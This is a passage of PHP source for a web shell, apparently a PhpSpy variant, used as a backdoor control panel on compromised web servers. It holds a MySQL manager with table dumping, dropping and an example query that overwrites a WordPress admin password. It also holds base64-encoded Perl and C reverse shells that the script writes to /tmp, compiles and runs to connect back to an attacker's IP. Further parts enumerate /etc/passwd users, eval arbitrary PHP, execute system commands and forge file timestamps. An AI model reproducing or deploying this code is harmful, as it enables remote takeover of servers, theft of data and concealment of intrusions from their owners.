    $dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
  
    if(isset($dbhost)){
  
        $dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
  
    }
  
    if(isset($dbuser)) {
  
        $dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
  
    }
  
    if(isset($dbpass)) {
  
        $dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
  
    }
  
    if(isset($dbport)) {
  
        $dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
  
    }
  
    if(isset($dbname)) {
  
        $dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
  
    }
  
    if(isset($charset)) {
  
        $dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
  
    }
  
  
  
    if ($doing == 'backupmysql' && $saveasfile) {
  
        if (!$table) {
  
            m('Please choose the table');
  
        } else {
  
            dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
  
            $table = array_flip($table);
  
            $fp = @fopen($path,'w');
  
            if ($fp) {
  
                $result = q('SHOW tables');
  
                if (!$result) p('<h2>'.mysql_error().'</h2>');
  
                $mysqldata = '';
  
                while ($currow = mysql_fetch_array($result)) {
  
                    if (isset($table[$currow[0]])) {
  
                        sqldumptable($currow[0], $fp);
  
                    }
  
                }
  
                fclose($fp);
  
                $fileurl = str_replace(SA_ROOT,'',$path);
  
                m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
  
                mysql_close();
  
            } else {
  
                m('Backup failed');
  
            }
  
        }
  
    }
  
    if ($insert && $insertsql) {
  
        $keystr = $valstr = $tmp = '';
  
        foreach($insertsql as $key => $val) {
  
            if ($val) {
  
                $keystr .= $tmp.$key;
  
                $valstr .= $tmp."'".addslashes($val)."'";
  
                $tmp = ',';
  
            }
  
        }
  
        if ($keystr && $valstr) {
  
            dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
  
            m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
  
        }
  
    }
  
    if ($update && $insertsql && $base64) {
  
        $valstr = $tmp = '';
  
        foreach($insertsql as $key => $val) {
  
            $valstr .= $tmp.$key."='".addslashes($val)."'";
  
            $tmp = ',';
  
        }
  
        if ($valstr) {
  
            $where = base64_decode($base64);
  
            dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
  
            m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
  
        }
  
    }
  
    if ($doing == 'del' && $base64) {
  
        $where = base64_decode($base64);
  
        $delete_sql = "DELETE FROM $tablename WHERE $where";
  
        dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
  
        m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
  
    }
  
  
  
    if ($tablename && $doing == 'drop') {
  
        dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
  
        if (q("DROP TABLE $tablename")) {
  
            m('Drop table of success');
  
            $tablename = '';
  
        } else {
  
            m(mysql_error());
  
        }
  
    }
  
  
  
    $charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');
  
  
  
    formhead(array('title'=>'MYSQL Manager'));
  
    makehide('action','sqladmin');
  
    p('<p>');
  
    p('DBHost:');
  
    makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
  
    p(':');
  
    makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
  
    p('DBUser:');
  
    makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
  
    p('DBPass:');
  
    makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
  
    p('DBCharset:');
  
    makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
  
    makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
  
    p('</p>');
  
    formfoot();
  
?>
  
<script type="text/javascript">
  
function editrecord(action, base64, tablename){
  
    if (action == 'del') {
  
        if (!confirm('Is or isn\'t deletion record?')) return;
  
    }
  
    $('recordlist').doing.value=action;
  
    $('recordlist').base64.value=base64;
  
    $('recordlist').tablename.value=tablename;
  
    $('recordlist').submit();
  
}
  
function moddbname(dbname) {
  
    if(!dbname) return;
  
    $('setdbname').dbname.value=dbname;
  
    $('setdbname').submit();
  
}
  
function settable(tablename,doing,page) {
  
    if(!tablename) return;
  
    if (doing) {
  
        $('settable').doing.value=doing;
  
    }
  
    if (page) {
  
        $('settable').page.value=page;
  
    }
  
    $('settable').tablename.value=tablename;
  
    $('settable').submit();
  
}
  
</script>
  
<?php
  
    // SQL
  
    formhead(array('name'=>'recordlist'));
  
    makehide('doing');
  
    makehide('action','sqladmin');
  
    makehide('base64');
  
    makehide('tablename');
  
    p($dbform);
  
    formfoot();
  
  
  
    // Data
  
    formhead(array('name'=>'setdbname'));
  
    makehide('action','sqladmin');
  
    p($dbform);
  
    if (!$dbname) {
  
        makehide('dbname');
  
    }
  
    formfoot();
  
  
  
  
  
    formhead(array('name'=>'settable'));
  
    makehide('action','sqladmin');
  
    p($dbform);
  
    makehide('tablename');
  
    makehide('page',$page);
  
    makehide('doing');
  
    formfoot();
  
  
  
    $cachetables = array();
  
    $pagenum = 30;
  
    $page = intval($page);
  
    if($page) {
  
        $start_limit = ($page - 1) * $pagenum;
  
    } else {
  
        $start_limit = 0;
  
        $page = 1;
  
    }
  
    if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
  
        dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
  
        // get mysql server
  
        $mysqlver = mysql_get_server_info();
  
        p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
  
        $highver = $mysqlver > '4.1' ? 1 : 0;
  
  
  
        // Show database
  
        $query = q("SHOW DATABASES");
  
        $dbs = array();
  
        $dbs[] = '-- Select a database --';
  
        while($db = mysql_fetch_array($query)) {
  
            $dbs[$db['Database']] = $db['Database'];
  
        }
  
        makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
  
        $tabledb = array();
  
        if ($dbname) {
  
            p('<p>');
  
            p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
  
            if ($tablename) {
  
                p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
  
            }
  
            p('</p>');
  
            mysql_select_db($dbname);
  
  
  
            $getnumsql = '';
  
            $runquery = 0;
  
            if ($sql_query) {
  
                $runquery = 1;
  
            }
  
            $allowedit = 0;
  
            if ($tablename && !$sql_query) {
  
                $sql_query = "SELECT * FROM $tablename";
  
                $getnumsql = $sql_query;
  
                $sql_query = $sql_query." LIMIT $start_limit, $pagenum";
  
                $allowedit = 1;
  
            }
  
            p('<form action="'.$self.'" method="POST">');
  
            p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database <font color=red><b>'.$dbname.'</font></b>:<BR>Example VBB Password: <font color=red>vbateam</font><BR><font color=yellow>UPDATE `wp_users` SET `user_pass` = \'36adbd38209c836b477e50e4e5cd1fa0\' WHERE `ID` = \'1\'
			</font>
  
            </td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
  
            makehide('tablename', $tablename);
  
            makehide('action','sqladmin');
  
            p($dbform);
  
            p('</form>');
  
            if ($tablename || ($runquery && $sql_query)) {
  
                if ($doing == 'structure') {
  
                    $result = q("SHOW COLUMNS FROM $tablename");
  
                    $rowdb = array();
  
                    while($row = mysql_fetch_array($result)) {
  
                        $rowdb[] = $row;
  
                    }
  
                    p('<table border="0" cellpadding="3" cellspacing="0">');
  
                    p('<tr class="head">');
  
                    p('<td>Field</td>');
  
                    p('<td>Type</td>');
  
                    p('<td>Null</td>');
  
                    p('<td>Key</td>');
  
                    p('<td>Default</td>');
  
                    p('<td>Extra</td>');
  
                    p('</tr>');
  
                    foreach ($rowdb as $row) {
  
                        $thisbg = bg();
  
                        p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
  
                        p('<td>'.$row['Field'].'</td>');
  
                        p('<td>'.$row['Type'].'</td>');
  
                        p('<td>'.$row['Null'].'&nbsp;</td>');
  
                        p('<td>'.$row['Key'].'&nbsp;</td>');
  
                        p('<td>'.$row['Default'].'&nbsp;</td>');
  
                        p('<td>'.$row['Extra'].'&nbsp;</td>');
  
                        p('</tr>');
  
                    }
  
                    tbfoot();
  
                } elseif ($doing == 'insert' || $doing == 'edit') {
  
                    $result = q('SHOW COLUMNS FROM '.$tablename);
  
                    while ($row = mysql_fetch_array($result)) {
  
                        $rowdb[] = $row;
  
                    }
  
                    $rs = array();
  
                    if ($doing == 'insert') {
  
                        p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
  
                    } else {
  
                        p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
  
                        $where = base64_decode($base64);
  
                        $result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
  
                        $rs = mysql_fetch_array($result);
  
                    }
  
                    p('<form method="post" action="'.$self.'">');
  
                    p($dbform);
  
                    makehide('action','sqladmin');
  
                    makehide('tablename',$tablename);
  
                    p('<table border="0" cellpadding="3" cellspacing="0">');
  
                    foreach ($rowdb as $row) {
  
                        if ($rs[$row['Field']]) {
  
                            $value = htmlspecialchars($rs[$row['Field']]);
  
                        } else {
  
                            $value = '';
  
                        }
  
                        $thisbg = bg();
  
                        p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
  
                        p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
  
                    }
  
                    if ($doing == 'insert') {
  
                        p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
  
                    } else {
  
                        p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
  
                        makehide('base64', $base64);
  
                    }
  
                    p('</table></form>');
  
                } else {
  
                    $querys = @explode(';',$sql_query);
  
                    foreach($querys as $num=>$query) {
  
                        if ($query) {
  
                            p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
  
                            switch(qy($query))
  
                            {
  
                                case 0:
  
                                    p('<h2>Error : '.mysql_error().'</h2>');
  
                                    break;
  
                                case 1:
  
                                    if (strtolower(substr($query,0,13)) == 'select * from') {
  
                                        $allowedit = 1;
  
                                    }
  
                                    if ($getnumsql) {
  
                                        $tatol = mysql_num_rows(q($getnumsql));
  
                                        $multipage = multi($tatol, $pagenum, $page, $tablename);
  
                                    }
  
                                    if (!$tablename) {
  
                                        $sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
  
                                        $sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
  
                                        preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
  
                                        $tablename = $matches[1][0];
  
                                    }
  
                                    $result = q($query);
  
                                    p($multipage);
  
                                    p('<table border="0" cellpadding="3" cellspacing="0">');
  
                                    p('<tr class="head">');
  
                                    if ($allowedit) p('<td>Action</td>');
  
                                    $fieldnum = @mysql_num_fields($result);
  
                                    for($i=0;$i<$fieldnum;$i++){
  
                                        $name = @mysql_field_name($result, $i);
  
                                        $type = @mysql_field_type($result, $i);
  
                                        $len = @mysql_field_len($result, $i);
  
                                        p("<td nowrap>$name<br><span>$type($len)</span></td>");
  
                                    }
  
                                    p('</tr>');
  
                                    while($mn = @mysql_fetch_assoc($result)){
  
                                        $thisbg = bg();
  
                                        p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
  
                                        $where = $tmp = $b1 = '';
  
                                        foreach($mn as $key=>$inside){
  
                                            if ($inside) {
  
                                                $where .= $tmp.$key."='".addslashes($inside)."'";
  
                                                $tmp = ' AND ';
  
                                            }
  
                                            $b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
  
                                        }
  
                                        $where = base64_encode($where);
  
                                        if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');
  
                                        p($b1);
  
                                        p('</tr>');
  
                                        unset($b1);
  
                                    }
  
                                    tbfoot();
  
                                    p($multipage);
  
                                    break;
  
                                case 2:
  
                                    $ar = mysql_affected_rows();
  
                                    p('<h2>affected rows : <b>'.$ar.'</b></h2>');
  
                                    break;
  
                            }
  
                        }
  
                    }
  
                }
  
            } else {
  
                $query = q("SHOW TABLE STATUS");
  
                $table_num = $table_rows = $data_size = 0;
  
                $tabledb = array();
  
                while($table = mysql_fetch_array($query)) {
  
                    $data_size = $data_size + $table['Data_length'];
  
                    $table_rows = $table_rows + $table['Rows'];
  
                    $table['Data_length'] = sizecount($table['Data_length']);
  
                    $table_num++;
  
                    $tabledb[] = $table;
  
                }
  
                $data_size = sizecount($data_size);
  
                unset($table);
  
                p('<table border="0" cellpadding="0" cellspacing="0">');
  
                p('<form action="'.$self.'" method="POST">');
  
                makehide('action','sqladmin');
  
                p($dbform);
  
                p('<tr class="head">');
  
                p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
  
                p('<td>Name</td>');
  
                p('<td>Rows</td>');
  
                p('<td>Data_length</td>');
  
                p('<td>Create_time</td>');
  
                p('<td>Update_time</td>');
  
                if ($highver) {
  
                    p('<td>Engine</td>');
  
                    p('<td>Collation</td>');
  
                }
  
                p('</tr>');
  
                foreach ($tabledb as $key => $table) {
  
                    $thisbg = bg();
  
                    p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
  
                    p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
  
                    p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a> [ <a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a> ]</td>');
  
                    p('<td>'.$table['Rows'].'</td>');
  
                    p('<td>'.$table['Data_length'].'</td>');
  
                    p('<td>'.$table['Create_time'].'</td>');
  
                    p('<td>'.$table['Update_time'].'</td>');
  
                    if ($highver) {
  
                        p('<td>'.$table['Engine'].'</td>');
  
                        p('<td>'.$table['Collation'].'</td>');
  
                    }
  
                    p('</tr>');
  
                }
  
                p('<tr class=fout>');
  
                p('<td>&nbsp;</td>');
  
                p('<td>Total tables: '.$table_num.'</td>');
  
                p('<td>'.$table_rows.'</td>');
  
                p('<td>'.$data_size.'</td>');
  
                p('<td colspan="'.($highver ? 4 : 2).'">&nbsp;</td>');
  
                p('</tr>');
  
  
  
                p("<tr class=\"fout\"><td colspan=\"".($highver ? 8 : 6)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$_SERVER['HTTP_HOST']."sql.gz\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" name=\"downrar\" value=\"Export selection table\" /></td></tr>");
  
                makehide('doing','backupmysql');
  
                formfoot();
  
                p("</table>");
  
                fr($query);
  
            }
  
        }
  
    }
  
    tbfoot();
  
    @mysql_close();
  
}//end sql backup
  
  
  
  
  
elseif ($action == 'backconnect') {
  
    !$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
  
    !$yourport && $yourport = '12345';
  
    $usedb = array('perl'=>'perl','c'=>'c');
  
  
  
    $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
  
        "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
  
        "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
  
        "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
  
        "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
  
        "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
  
        "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
  
    $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
  
        "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
  
        "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
  
        "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
  
        "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
  
        "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
  
        "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
  
        "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
  
  
  
    if ($start && $yourip && $yourport && $use){
  
        if ($use == 'perl') {
  
            cf('/tmp/angel_bc',$back_connect);
  
            $res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &");
  
        } else {
  
            cf('/tmp/angel_bc.c',$back_connect_c);
  
            $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
  
            @unlink('/tmp/angel_bc.c');
  
            $res = execute("/tmp/angel_bc $yourip $yourport &");
  
        }
  
        m("Now script try connect to $yourip port $yourport ...");
  
    }
  
  
  
    formhead(array('title'=>'Back Connect'));
  
    makehide('action','backconnect');
  
    p('<p>');
  
    p('Your IP:');
  
    makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
  
    p('Your Port:');
  
    makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
  
    p('Use:');
  
    makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
  
    makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
  
    p('</p>');
  
    formfoot();
  
}//end backconnect window via NC
elseif ($action == 'etcpwd') {
  
formhead(array('title'=>'Get /etc/passwd'));
  
    makehide('action','etcpwd');
  
    makehide('dir',$nowpath);
  
$i = 0;
  
 echo "<p><br><textarea class=\"area\" id=\"phpcodexxx\" name=\"phpcodexxx\" cols=\"100\" rows=\"25\">";
  
while ($i < 60000) {
  
  
  
    $line = posix_getpwuid($i);
  
    if (!empty($line)) {
  
  
  
        while (list ($key, $vba_etcpwd) = each($line)){
  
            echo "".$vba_etcpwd."\n";
  
            break;
  
        }
  
  
  
    }
  
  
  
   $i++;
  
}
  
  echo "</textarea></p>";
  
    formfoot();
  
}
  
  
  
elseif ($action == 'eval') {
  
    $phpcode = trim($phpcode);
  
    if($phpcode){
  
        if (!preg_match('#<\?#si', $phpcode)) {
  
            $phpcode = "<?php\n\n{$phpcode}\n\n?>";
  
        }
  
        eval("?".">$phpcode<?");
  
    }
  
    formhead(array('title'=>'Eval PHP Code'));
  
    makehide('action','eval');
  
    maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
  
    p('<p><a href="http://www.4ngel.net/phpspy/plugin/" target="_blank">Get plugins</a></p>');
  
    formfooter();
  
}//end eval
  
  
  
elseif ($action == 'editfile') {
  
    if(file_exists($opfile)) {
  
        $fp=@fopen($opfile,'r');
  
        $contents=@fread($fp, filesize($opfile));
  
        @fclose($fp);
  
        $contents=htmlspecialchars($contents);
  
    }
  
    formhead(array('title'=>'Create / Edit File'));
  
    makehide('action','file');
  
    makehide('dir',$nowpath);
  
    makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
  
    maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
  
    formfooter();
  
}//end editfile
  
  
  
elseif ($action == 'newtime') {
  
    $opfilemtime = @filemtime($opfile);
  
    //$time = strtotime("$year-$month-$day $hour:$minute:$second");
  
    $cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
  
    formhead(array('title'=>'Clone file was last modified time'));
  
    makehide('action','file');
  
    makehide('dir',$nowpath);
  
    makeinput(array('title'=>'Alter file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
  
    makeinput(array('title'=>'Reference file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
  
    formfooter();
  
    formhead(array('title'=>'Set last modified'));
  
    makehide('action','file');
  
    makehide('dir',$nowpath);
  
    makeinput(array('title'=>'Current file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
  
    p('<p>Instead &raquo;');
  
    p('year:');
  
    makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
  
    p('month:');
  
    makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
  
    p('day:');
  
    makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
  
    p('hour:');
  
    makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
  
    p('minute:');
  
    makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
  
    p('second:');
  
    makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
  
    p('</p>');
  
    formfooter();
  
}//end newtime
  
  
  
elseif ($action == 'shell') {
  
    if (IS_WIN && IS_COM) {
  
        if($program && $parameter) {
  
            $shell= new COM('Shell.Application');
  
            $a = $shell->ShellExecute($program,$parameter);
  
            m('Program run has '.(!$a ? 'success' : 'fail'));
  
        }
  
        !$program && $program = 'c:\windows\system32\cmd.exe';
  
        !$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';
  
        formhead(array('title'=>'Execute Program'));
  
        makehide('action','shell');
  
        makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
  
        p('<p>');
  
        makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
  
        makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
  
        p('</p>');
  
        formfoot();
  
    }
  
    formhead(array('title'=>'Execute Command'));
  
    makehide('action','shell');
  
    if (IS_WIN && IS_COM) {
  
        $execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
  
        makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
  
    }
  
    p('<p>');
  
    makeinput(array('title'=>'Command','name'=>'command','value'=>$command));
  
    makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
  
    p('</p>');
  
    formfoot();
  
  
  
    if ($command) {
  
        p('<hr width="100%" noshade /><pre>');
  
        if ($execfunc=='wscript' && IS_WIN && IS_COM) {
  
            $wsh = new COM('WScript.shell');
  
            $exec = $wsh->exec('cmd.exe /c '.$command);
  
            $stdout = $exec->StdOut();
  
            $stroutput = $stdout->ReadAll();
  
            echo $stroutput;
  
        } elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
  
            $descriptorspec = array(
  
               0 => array('pipe', 'r'),
  
               1 => array('pipe', 'w'),
  
               2 => array('pipe', 'w')
  
            );
  
            $process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
  
            if (is_resource($process)) {
  
                fwrite($pipes[0], $command."\r\n");
  
                fwrite($pipes[0], "exit\r\n");
  
                fclose($pipes[0]);
  
                while (!feof($pipes[1])) {
  
                    echo fgets($pipes[1], 1024);
  
                }
  
                fclose($pipes[1]);
  
                while (!feof($pipes[2])) {
  
                    echo fgets($pipes[2], 1024);
  
                }
  
                fclose($pipes[2]);
  
                proc_close($process);
  
            }
  
        } else {
  
            echo(execute($command));
  
        }
  
        p('</pre>');
  
    }
  
}//end shell
  
  
  
elseif ($action == 'phpenv') {
  
    $upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
  
    $adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
  
    !$dis_func && $dis_func = 'No';
  
    $info = array(
  
        1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
  
        2 => array('Server Domain',$_SERVER['SERVER_NAME']),
  
        3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
  
        4 => array('Server OS',PHP_OS),
  
        5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
  
        6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
  
        7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
  
        8 => array('PHP run mode',strtoupper(php_sapi_name())),
  
        9 => array('The file path',__FILE__),
  
  
  
        10 => array('PHP Version',PHP_VERSION),
  
        11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:goaction(\'phpinfo\');">Yes</a>' : 'No')),
  
        12 => array('Safe Mode',getcfg('safe_mode')),
  
        13 => array('Administrator',$adminmail),
  
        14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
  
        15 => array('enable_dl',getcfg('enable_dl')),
  
        16 => array('display_errors',getcfg('display_errors')),
  
        17 => array('register_globals',getcfg('register_globals')),
  
        18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
  
        19 => array('memory_limit',getcfg('memory_limit')),
  
        20 => array('post_max_size',getcfg('post_max_size')),
  
        21 => array('upload_max_filesize',$upsize),
  
        22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
  
        23 => array('disable_functions',$dis_func),
  
    );
  
  
  
    if($phpvarname) {
  
        m($phpvarname .' : '.getcfg($phpvarname));
  
    }
  
  
  
    formhead(array('title'=>'Server environment'));
  
    makehide('action','phpenv');
  
    makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
  
    formfooter();
  
  
  
    $hp = array(0=> 'Server', 1=> 'PHP');
  
    for($a=0;$a<2;$a++) {
  
        p('<h2>'.$hp[$a].' &raquo;</h2>');
  
        p('<ul class="info">');
  
        if ($a==0) {
  
            for($i=1;$i<=9;$i++) {
  
                p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
  
            }
  
        } elseif ($a == 1) {
  
            for($i=10;$i<=23;$i++) {
  
                p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
  
            }
  
        }
  
        p('</ul>');
  
    }
  
}//end phpenv
  
  
  
else {
  
    m('Undefined Action');
  
}
  
  
  
?>
  
</td></tr></table>
</body>
  
</html>
  
  
  
<?php
function m($msg) {
  
    echo '<div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">';
  
    echo $msg;
  
    echo '</div>';
  
}
  
